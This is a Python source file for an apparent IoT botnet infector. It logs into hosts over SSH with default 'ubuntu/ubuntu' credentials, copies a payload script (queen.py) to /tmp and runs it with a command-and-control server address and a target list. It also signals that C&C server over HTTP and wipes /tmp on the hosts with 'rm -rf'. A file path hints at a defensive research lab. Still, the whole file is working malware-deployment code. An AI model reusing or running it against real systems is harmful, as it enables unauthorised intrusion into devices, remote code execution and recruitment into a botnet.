import os, paramiko, requests, time
from scp import SCPClient

class Infector:

    def __init__(self, master, slaves, cc='130.234.169.87', cc_polling_interval=1, n_workers=1):
        self.cc = cc
        self.cc_polling_interval = cc_polling_interval
        self.n_workers = n_workers
        self.ip = master
        self.targets = slaves

    def create_SSH_connection(self, port, username, password):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(self.ip, port=port, username=username, password=password, timeout=3)
            return client
        except Exception as e:
            return None

    def send_file_over_SSH(self, client, file_name, remote_path):
        scp = SCPClient(client.get_transport())
        scp.put(file_name, remote_path=remote_path)

    def ssh_infect(self, file, local_path, remote_path='/tmp'):
        requests.post(url= 'http://{0}/command'.format(self.cc), json={'command': 'status'})
        try:
            client = self.create_SSH_connection(port=22, username='ubuntu', password='ubuntu')
            if client:
                self.send_file_over_SSH(client, os.path.join(local_path, file), remote_path)
                if file.endswith('.py'):
                    stdin, stdout, stderr = client.exec_command('python3 {0} {1} {2} {3} {4}'.format(
                        os.path.join(remote_path, file),
                        self.cc,
                        ','.join(self.targets),
                        self.cc_polling_interval,
                        self.n_workers
                    ))
                    exit_status = stdout.channel.recv_exit_status()
                client.close()
        except Exception as e:
            print(e)
            pass

    def clean_infection(self, remote_path='/tmp'):
        requests.post(url='http://{0}/command'.format(self.cc), json={'command': 'stop'})
        time.sleep(self.cc_polling_interval)
        for ip in [self.ip] + self.targets:
            try:
                client = self.create_SSH_connection(22, 'ubuntu', 'ubuntu')
                if client:
                    stdin, stdout, stderr = client.exec_command('rm -rf {0}'.format(os.path.join(remote_path,'*')))
                    exit_status = stdout.channel.recv_exit_status()
                    if exit_status == 0:
                        client.close()
            except Exception as e:
                 pass

if __name__ == '__main__':
    infector = Infector(master = '192.168.100.142', slaves = ['192.168.100.108','192.168.100.148'])
    infector.clean_infection()
    infector.ssh_infect('queen.py', '/home/mikhail/PycharmProjects/Defender/iot/malware/beerai')